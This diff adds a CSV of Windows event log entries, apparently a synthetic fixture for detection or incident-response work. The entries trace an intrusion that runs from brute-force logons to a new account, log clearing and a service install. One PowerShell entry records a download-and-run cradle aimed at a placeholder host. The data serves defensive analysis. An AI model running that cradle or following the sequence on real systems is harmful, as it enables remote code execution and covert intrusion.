@@ -1,0 +1,13 @@
+timestamp,host,channel,event_id,provider,account,src_ip,message
+2026-09-18T08:01:00Z,WS-014,Security,4625,Microsoft-Windows-Security-Auditing,jsingh,198.51.100.24,An account failed to log on
+2026-09-18T08:02:00Z,WS-014,Security,4625,Microsoft-Windows-Security-Auditing,jsingh,198.51.100.24,An account failed to log on
+2026-09-18T08:03:00Z,WS-014,Security,4625,Microsoft-Windows-Security-Auditing,jsingh,198.51.100.24,An account failed to log on
+2026-09-18T08:04:00Z,WS-014,Security,4625,Microsoft-Windows-Security-Auditing,jsingh,198.51.100.24,An account failed to log on
+2026-09-18T08:05:00Z,WS-014,Security,4625,Microsoft-Windows-Security-Auditing,jsingh,198.51.100.24,An account failed to log on
+2026-09-18T08:06:00Z,WS-014,Security,4624,Microsoft-Windows-Security-Auditing,jsingh,198.51.100.24,An account was successfully logged on
+2026-09-18T08:12:00Z,DC-01,Security,4720,Microsoft-Windows-Security-Auditing,svc_backup,10.0.4.12,A user account was created
+2026-09-18T08:14:00Z,DC-01,Security,4732,Microsoft-Windows-Security-Auditing,helpdesk-temp,10.0.4.12,A member was added to a security-enabled local group
+2026-09-18T08:20:00Z,WS-014,Microsoft-Windows-PowerShell/Operational,4104,PowerShell,jsingh,198.51.100.24,ScriptBlockText: Invoke-Expression (New-Object Net.WebClient).DownloadString('https://example.invalid/payload')
+2026-09-18T08:26:00Z,DC-01,Security,1102,Microsoft-Windows-Eventlog,,10.0.4.12,The audit log was cleared
+2026-09-18T08:30:00Z,WS-014,Security,4648,Microsoft-Windows-Security-Auditing,jsingh,10.0.4.12,A logon was attempted using explicit credentials
+2026-09-18T08:33:00Z,WS-014,Security,4697,Microsoft-Windows-Security-Auditing,svc_update,10.0.4.12,A service was installed in the system
